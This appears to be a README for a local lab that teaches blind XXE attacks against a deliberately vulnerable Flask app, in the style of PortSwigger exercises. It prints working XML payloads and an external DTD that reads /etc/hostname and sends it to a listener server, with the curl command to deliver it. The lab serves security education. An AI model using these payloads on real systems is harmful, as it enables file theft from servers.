# 🧪 Blind XXE Vulnerable Flask App (Local Lab)

This project is a **local lab for practicing Blind XXE (XML External Entity) attacks**, inspired by PortSwigger Web Security Academy labs.

The application is intentionally vulnerable and designed **for educational and testing purposes only**.

---

## 📁 Project Structure

```
project/
│
├── backend/
│   ├── app.py
│   └── requirements.txt
│
└── attacker/
    └── evil.dtd
```

---

## ⚙️ Backend Setup & Run

### 1️⃣ Install dependencies

Navigate to the backend directory:

```bash
cd backend
```

Install required Python packages:

```bash
pip install -r requirements.txt
```

---

### 2️⃣ Run the Flask application

```bash
python app.py
```

The vulnerable web application will start (default: `http://127.0.0.1:5000`).

---

## 🧩 Task One — Blind XXE Detection (No Data Output)

### 🎯 Goal

Confirm **Blind XXE** by observing **outbound HTTP requests**, even though the application response shows nothing.

---

### 1️⃣ Start a tiny HTTP server (Attacker Listener)

Open a **new terminal** and run:

```bash
python3 -m http.server 8000
```

You can run this from **Desktop or any folder**.

This server is used to **capture outbound requests** made by the vulnerable XML parser.

---

### 2️⃣ XXE Payload (Paste into request body)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % xxe SYSTEM "http://127.0.0.1:8000/hello">
  %xxe;
]>
<data>test</data>
```

---

### 3️⃣ Expected Result

* ✅ Application response: **null / empty**
* ✅ Attacker server terminal shows:

```
GET /hello HTTP/1.1
```

This confirms:

* The XML parser processed the external entity
* The application made an **outbound request**
* The XXE is **blind** (no data shown in response)

---

### 🖼️ Attack Flow Diagram (Task One)

```
[ Attacker ]
     |
     |  Malicious XML
     v
[ Vulnerable Web App ]
     |
     |  Outbound request (not shown in response)
     v
[ Attacker HTTP Server ]
```

> Even though the response is empty, the outbound request proves the vulnerability.

---

## 🧩 Task Two — Blind XXE File Exfiltration (PortSwigger-style)

This task fully recreates the **PortSwigger Blind XXE with External DTD** lab **locally**, without Burp Collaborator or cloud services.

---

## 🎯 Goal

Exfiltrate the contents of:

```
/etc/hostname
```

Using:

* Blind XXE
* External DTD
* Out-of-band HTTP exfiltration

---

## 🖥️ Step 1 — Start Two Terminals

### Terminal 1: Run the vulnerable app

```bash
cd backend
python app.py
```

---

### Terminal 2: Prepare attacker server

```bash
mkdir attacker
cd attacker
```

---

## 🧬 Step 2 — Create the Malicious External DTD

Create `evil.dtd`:

```bash
nano evil.dtd
```

Paste **exactly**:

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8000/?data=%file;'>">
%eval;
%exfil;
```

### What this does

| Entity   | Purpose                                    |
| -------- | ------------------------------------------ |
| `%file`  | Reads `/etc/hostname`                      |
| `%eval`  | Dynamically creates an exfiltration entity |
| `%exfil` | Sends file contents via HTTP               |

---

## 🌐 Step 3 — Host the Malicious DTD

From inside the `attacker/` directory:

```bash
python3 -m http.server 8000
```

This acts like:

* Burp Exploit Server
* Burp Collaborator (locally)

---

## 🧬 Step 4 — Send the XXE Payload

Create the XML payload:

```bash
nano payload.xml
```

Paste:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % xxe SYSTEM "http://127.0.0.1:8000/evil.dtd">
  %xxe;
]>
<data>test</data>
```

Send it to the vulnerable endpoint:

```bash
curl -X POST http://127.0.0.1:5000/xml \
  -H "Content-Type: application/xml" \
  --data-binary @payload.xml
```

---

## 👀 Step 5 — Observe the Exfiltration (Success Condition)

### Flask Response

```json
{
  "result": null
}
```

✅ Expected (Blind XXE)

---

### Attacker Server Output

```
GET /evil.dtd HTTP/1.1
GET /?data=your-hostname-here HTTP/1.1
```

🔥 **SUCCESS**

The contents of `/etc/hostname` were exfiltrated via HTTP.

---

## 🖼️ Attack Flow Diagram (Task Two)

```
[ Attacker ]
     |
     |  XML with external DTD reference
     v
[ Vulnerable Flask App ]
     |
     |  Loads evil.dtd
     |  Reads /etc/hostname
     v
[ Attacker HTTP Server ]
     |
     |  GET /?data=<hostname>
     v
[ Stolen Data ]
```

---

## 🧠 Key Takeaways

* Blind XXE does **not** require visible output
* Success is proven by **outbound network traffic**
* External DTDs allow **file read + exfiltration**
* This lab is functionally identical to **PortSwigger’s Blind XXE labs**

---

## ⚠️ Disclaimer

This project is for **learning and security testing only**.
Do **not** use these techniques on systems you do not own or have permission to test.

---

